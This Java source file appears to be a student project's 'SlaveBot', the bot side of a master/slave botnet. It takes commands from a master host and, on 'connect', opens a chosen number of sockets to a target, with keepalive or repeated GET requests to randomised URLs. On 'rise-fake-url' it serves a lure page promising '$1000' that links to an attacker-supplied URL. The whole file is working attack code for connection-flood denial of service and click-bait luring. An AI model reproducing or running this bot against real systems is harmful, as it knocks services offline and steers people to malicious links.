import java.io.*;
import java.net.*;
import java.util.*;
import java.security.SecureRandom;

class SlaveBot extends Thread{

public static ArrayList<crawler_details> crawler_list=new ArrayList<crawler_details>(); 

public static String createRandomCode(int Length, String s){
Random r=new Random();
 char[] ch=s.toCharArray();    
StringBuilder sb =new StringBuilder();
Random random =new SecureRandom();
int output_length=r.nextInt(Length);
for(int e=0;e<=output_length;e++)
{
char c= ch[random.nextInt(ch.length)];
sb.append(c);
}
String o=sb.toString();
System.out.println("random code : "+o);
 return o;
}
static int target_port_input;
static String target_name;
static int target_port;
static int no_of_connections;
static Socket target_socket;
public static ArrayList<target_details> target_list=new ArrayList<target_details>();

public static void main(String args[]) throws Exception
{

int openport=0,portnumber=0;
ServerSocket ss=null;
String ipaddress=null;
String command5=null;
Socket soc=null,socketp3;
if(args.length == 4){
if(args[0].equals("-h") && args[2].equals("-p")){
 ipaddress=args[1];
 portnumber=Integer.parseInt(args[3]);}
else{
System.out.println("Invalid command:");
System.exit(0);
}
}
else{
System.out.println("Invalid command:");
System.exit(0);
}

try{
soc=new Socket(ipaddress,portnumber);
}catch(Exception e22){System.out.println(e22);}	
//passing data from client to server
String tt,ttt;
Scanner sc1=new Scanner(soc.getInputStream());

while(true){
tt=sc1.nextLine();
//master reads command , splits it and process request
String delim = " ";
	String[ ] t=new String[5];
	int i=0;
StringTokenizer st = new StringTokenizer(tt, delim, true);
boolean expectDelim = false;
while (st.hasMoreTokens()) {
    String token = st.nextToken();
	if (delim.equals(token)) 
	{
        if (expectDelim) {
            expectDelim = false;
            continue;
        } else {
            // unexpected delim means empty token
            token = null;
        }
    }
	t[i]=token;
	i=i+1;
        expectDelim = true;
}

if(("rise-fake-url".equals(t[0]) || "down-fake-url".equals(t[0])) && i==3)
{
openport=Integer.parseInt(t[1]);
String url=t[2];
if("rise-fake-url".equals(t[0])){
try{
ss=new ServerSocket(openport);
}catch(Exception e11){e11.getMessage();}

socketp3=ss.accept();
PrintStream pp=new PrintStream(socketp3.getOutputStream());
PrintWriter pout = new PrintWriter(socketp3.getOutputStream());
    	
    	String html = "<html>\r\n" + 
    			"<head>\r\n" + 
    			"</head>\r\n" + 
    			"<body>\r\n" + 
    			"\r\n" + 
    			"<ul>\r\n" + 
			"<h1>Welcome to Project 3 of Network design</h1>\r\n"+
			"<h2>Click here to earn $1000</h2>\r\n"+
    			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n" + 
    			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n" +  
			 "</ul>\r\n" +  
			"<h2>Click on any of the ten links below to win:-</h2>\r\n"+
			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n"+
			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n"+
			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n"+
			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n"+
			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n"+
			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n"+
			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n"+
			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n"+
			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n"+
			"  <li><a href=\"http://" + url + "\">Check this out!</a></li>\r\n"+
    			"\r\n" + 
    			"</body>\r\n" + 
    			"</html>";
    	
    	pout.println("HTTP/1.1 200 OK");
    	pout.println("Content-Type: text/html");
        pout.println("\r\n");
        pout.println(html);
	pout.close();
}

if("down-fake-url".equals(t[0]))
ss.close();
}//main if rise,down

else if("connect".equals(t[0])){
target_name=t[1];
target_port=Integer.parseInt(t[2]);
no_of_connections=Integer.parseInt(t[3]);

if(i==5)
command5=t[4];

for(int c=0;c<no_of_connections;c++)
{
try{
target_details td=new target_details( );
target_socket=new Socket(target_name,target_port);

if(i==5)
{
if(command5.equalsIgnoreCase("keepalive"))
  {
System.out.println("I am at keepalive");
target_socket.setKeepAlive(true);
  }
else if(command5.contains("url="))
{
System.out.println("given url is : "+command5);
String url=command5.substring(4);
String randomcode=createRandomCode(10,"abcdefghijklmnopqrstuvwxyz");
String Final_url=url+randomcode;
//String Final_url=url;
System.out.println("final url is : "+Final_url);
PrintWriter out=new PrintWriter(new BufferedWriter(new OutputStreamWriter(target_socket.getOutputStream(),"UTF8")));
String http_request="https://"+t[1]+Final_url;
System.out.println("http request : "+http_request);
out.println("GET /"+Final_url+" HTTP/1.0\r\n\r\n");

out.flush();

BufferedReader in=new BufferedReader(new InputStreamReader(target_socket.getInputStream()));
String response=in.readLine();
if(response!=null)
System.out.println("response : "+response);

System.out.println("Connected Via: " + target_socket.getInetAddress().getLocalHost()+ ":" + target_socket.getLocalPort());
out.close();
in.close();
}
else
System.out.println("invalid command from master");
}

td.target_name1=target_socket.getInetAddress().getHostName();
td.target_ipaddress1=target_socket.getInetAddress().getHostAddress();
td.target_portnumber1=target_port;
td.target_socket1=target_socket;
target_list.add(td);
}catch(IOException e44){System.out.println(e44);}
}
}


else if("disconnect".equals(t[0]))
{
Socket target_socket;
target_name=t[1];
target_port_input=Integer.parseInt(t[2]);
int found=0;
if(target_port_input==0)
{int z=target_list.size()-1;
while(z>=0)
{
if((target_name.equals(target_list.get(z).target_ipaddress1))||(target_name.equals(target_list.get(z).target_name1)))
{
target_socket=target_list.get(z).target_socket1;
target_socket.close();
target_list.remove(z);
found=1;
}
z=z-1;
}
if(found==0)
System.out.println("this slave is not connected to"+target_name);
}
else
{
int z=target_list.size()-1;
while(z>=0)
{
if(((target_name.equals(target_list.get(z).target_ipaddress1))||(target_name.equals(target_list.get(z).target_name1)))&&(target_port_input == target_list.get(z).target_portnumber1))
{
target_socket=target_list.get(z).target_socket1;
target_socket.close();
target_list.remove(z);
found=1;
}
z=z-1;
}
if(found==0)
System.out.println("this slave is not connected to"+target_name);
}
}
else System.out.println("invalid command from MasterBot");
}
}
}

class target_details{
String target_name1;
String target_ipaddress1;
int target_portnumber1;
Socket target_socket1;
}


class crawler implements Runnable{
Socket client;
//constructor
crawler(Socket client)
{
this.client=client;}
public void run(){
crawler_details cd=new crawler_details();
try{
cd.slave_name=client.getInetAddress().getHostName();
cd.slave_ipaddress=client.getInetAddress().getHostAddress();
cd.slave_port=client.getPort();
cd.slave_socket=client;

SlaveBot.crawler_list.add(cd);
}catch(Exception e){ }
}
}

class crawler_details{
String slave_name;
String slave_ipaddress;
int slave_port;
Socket slave_socket;
}
